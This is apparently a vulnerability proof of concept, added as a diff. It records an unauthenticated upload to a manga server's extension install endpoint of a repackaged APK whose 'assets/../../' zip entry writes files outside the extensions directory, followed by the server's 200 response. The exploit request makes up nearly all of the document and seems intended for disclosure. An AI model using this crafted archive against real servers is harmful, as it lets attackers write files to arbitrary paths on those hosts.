@@ -1,0 +1,23 @@
+REQUEST (unauthenticated): POST /api/v1/extension/install
+Host: localhost:4567
+Content-Type: multipart/form-data; boundary=----poc
+
+------poc
+Content-Disposition: form-data; name="file"; filename="tachiyomi-all.buondua-revived-v1.4.2.apk"
+Content-Type: application/vnd.android.package-archive
+
+<valid Tachiyomi extension APK (real classes.dex + AndroidManifest, versionName 1.4.2)
+ repackaged with one extra Zip entry whose name is:
+   assets/../../../../../../../../../../../../tmp/suwa_pwned_zipslip
+ The name starts with "assets/" so it passes the only guard, then "../" escapes the
+ extensions asset folder to an attacker-chosen absolute path.>  (50209 bytes)
+------poc--
+
+RESPONSE: HTTP/1.1 200 OK
+Server: Jetty(12.1.8)
+Content-Type: text/plain
+Content-Length: 0
+
+Install accepted. During install the server extracts every APK entry whose name starts
+with "assets/" to  <extensionsRoot>/<name>_assets / <entry name>  with no path
+normalization, so the "../" sequence writes outside the extensions directory.
